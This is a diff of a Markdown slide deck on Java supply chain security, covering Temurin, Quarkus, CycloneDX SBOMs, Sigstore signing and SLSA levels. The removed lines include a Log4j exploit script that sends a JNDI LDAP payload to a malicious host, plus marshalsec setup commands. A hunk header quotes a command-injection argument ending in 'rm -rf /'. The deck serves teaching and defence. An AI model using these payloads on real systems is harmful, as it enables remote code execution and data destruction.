@@ -141,31 +141,11 @@ perl script.pl 'http://www.yourcompany.com; rm -rf /'
 
 ---
 
-![bg 70%](./assets/supply-chain-threats.png)
-
----
-
 
 ## Why do we care?
 
 [NASA’s Boeing Starliner Crew Flight Test Launch – June 5, 2024 (Official NASA Broadcast)](https://www.youtube.com/watch?v=HneVxAmYcaA) 
 ![bg right 90%](./assets/rht-openjdk-nasa.jpg)
-
----
-## Consumers being consumed
-
-- OpenJDK Temurin
-- Quarkus example
-
----
-
-## Shifting Left
-### Red Hat play a leadship and key role upstream
-
-- Red Hat [joined](https://www.redhat.com/en/blog/red-hat-joins-eclipse-adoptium-working-group) Eclipse Adptium WG in 2021. The OpenJDK code, build, tests and binaires have now a new home upstream.
-- The Adoptium [security audit report](https://ostif.org/wp-content/uploads/2024/06/Temurin-Final-Report.pdf) and [response document](https://adoptium.net/pdf/temurin-audit-response.pdf) were published last month. :rocket:
-- With the European Union’s Cyber Resilience Act (CRA) and for all this to work, we need to establish a common specifications for secure software development based on open source best practices. [Bring OSS foundation together and have a single voice](https://blogs.eclipse.org/post/mike-milinkovich/open-source-community-building-cybersecurity-processes-cra-compliance)
-- Collaboration on the [Adoptium Temurin build's Supply Chain Security](https://outreach.eclipse.foundation/adoptium-temurin-supply-chain-security)
 
 ---
 
@@ -177,10 +157,29 @@ perl script.pl 'http://www.yourcompany.com; rm -rf /'
 
 ---
 
+![bg 70%](./assets/supply-chain-threats.png)
+
+---
+## Shifting Left
+### Red Hat play a leadship and key role upstream
+
+- Red Hat [joined](https://www.redhat.com/en/blog/red-hat-joins-eclipse-adoptium-working-group) Eclipse Adptium WG in 2021. The OpenJDK code, build, tests and binaires have now a new home upstream.
+- The Adoptium [security audit report](https://ostif.org/wp-content/uploads/2024/06/Temurin-Final-Report.pdf) and [response document](https://adoptium.net/pdf/temurin-audit-response.pdf) were published last month. :rocket:
+- With the European Union’s Cyber Resilience Act (CRA) and for all this to work, we need to establish a common specifications for secure software development based on open source best practices. [Bring OSS foundation together and have a single voice](https://blogs.eclipse.org/post/mike-milinkovich/open-source-community-building-cybersecurity-processes-cra-compliance)
+- Collaboration on the [Adoptium Temurin build's Supply Chain Security](https://outreach.eclipse.foundation/adoptium-temurin-supply-chain-security)
+
+---
+
+![bg 80%](./assets/temurin-example.png)
+
+
+---
+
 ## Quarkus - Example
 
 - Supersonic Subatomic Java  :rocket:
 - Designed for Kubernetes and optimized for GraalVM and OpenJDK HotSpot
+- A consumer :fork_and_knife: of OpenJDK and its dependencies.
 
 ---
 
@@ -195,14 +194,14 @@ perl script.pl 'http://www.yourcompany.com; rm -rf /'
 ## Generating SBOM Artifact
 
 - Tools and practices for generating SBOMs
-- Example: Using CycloneDX to generate an SBOM
+- Example: Using [CycloneDX](https://cyclonedx.org/) to generate an SBOM :cyclone:
 
 ---
 
-## Signing with Sigstore
+## Signing with Sigstore :closed_lock_with_key:
 
-- Benefits of signing artifacts
-- Example: Signing Quarkus artifacts with Sigstore
+- Benefits of signing artifacts 
+- Example: Signing Quarkus artifacts with Sigstore 
 
 ---
 
@@ -303,51 +302,6 @@ cycloneDXBomUtility analyze -i target/bom.xml
 
 ---
 
-### Exploiting the Log4j Vulnerability
-
-#### Python Script to Exploit Log4j CVE-2021-44228
-
-```python
-import requests
-
-# Target URL
-url = "http://localhost:8080"  # Adjust to the target's actual address
-
-# Malicious payload
-payload = '${jndi:ldap://malicious-server.com/a}'
-
-# Sending the payload
-headers = {
-    'User-Agent': payload
-}
-
-response = requests.get(url, headers=headers)
-print("Exploit sent, check your LDAP server for interactions.")
-```
-
----
-
-#### Running the Exploit
-
-1. **Set Up a Malicious LDAP Server:**
-
-You can use a tool like `marshalsec` to set up a malicious LDAP server that serves the payload.
-
-```bash
-git clone https://github.com/mbechler/marshalsec.git
-cd marshalsec
-mvn clean package -DskipTests
-java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-malicious-server.com/#Exploit"
-```
-
-2. **Run the Exploit Script:**
-
-```bash
-python exploit_log4j.py
-```
-
----
-
 ### Remediation
 
 To remediate the Log4j vulnerability, update to a non-vulnerable version (e.g., 2.17.0).
@@ -370,6 +324,45 @@ To remediate the Log4j vulnerability, update to a non-vulnerable version (e.g., 
 mvn clean package
 java -cp target/log4j-example-1.0-SNAPSHOT.jar com.example.App
 ```
+---
+
+## Signing
+install : 
+```
+brew install sigstore```
+---
+
+## Current SLSA Level Achieved
+
+- Following the steps provided, the project would likely achieve SLSA Level 2 due to:
+  - Automated Build Process: Using Maven for building and deploying.
+  - Provenance: Generating an SBOM with CycloneDX.
+  - Artifact Integrity: Signing artifacts with GPG or Sigstore.
+
+---
+
+## Steps to Achieve Higher SLSA Levels
+
+- To Achieve SLSA Level 3
+  - Two-Person Review
+    - Implement mandatory code reviews in your repository settings.
+    - Use protected branches to ensure that all changes are reviewed by at least one other person before merging.
+  - Build Verification
+    - Use a CI/CD pipeline that verifies the build (e.g., GitHub Actions).
+    - Store build logs and metadata to verify that the build process was followed correctly.
+
+---
+
+## Steps to Achieve Higher SLSA Levels
+
+- To Achieve SLSA Level 4
+  - Hermetic Builds
+    - Use containerized build environments to ensure that builds are isolated from external influences.
+    - Ensure all dependencies are pinned to specific versions and downloaded from trusted sources.
+  - Reproducible Builds
+    - Configure the build process to ensure that the same inputs produce the same outputs.
+    - Use tools and practices that support reproducible builds, such as using exact timestamps and ensuring no network access during builds.
+
 
 ---
 
@@ -389,6 +382,10 @@ java -cp target/log4j-example-1.0-SNAPSHOT.jar com.example.App
 
 # References & Credits
 
-- SLSA Supply Chain Threats Overview: SLSA Spec
-- 
-
+- References:
+  - SLSA Supply Chain Threats Overview: SLSA Spec
+- Credits:
+  - The Red Hat Java Team and espcially:
+    - Shelly Lambert, for her insights, patience and sharing all her work and presentations
+    - Tim Ellison for his passion, and sharing his knowledge at every opportunity. 
+    - Deepak Bhole for everything else I learned about OpenJDK at Red Hat.
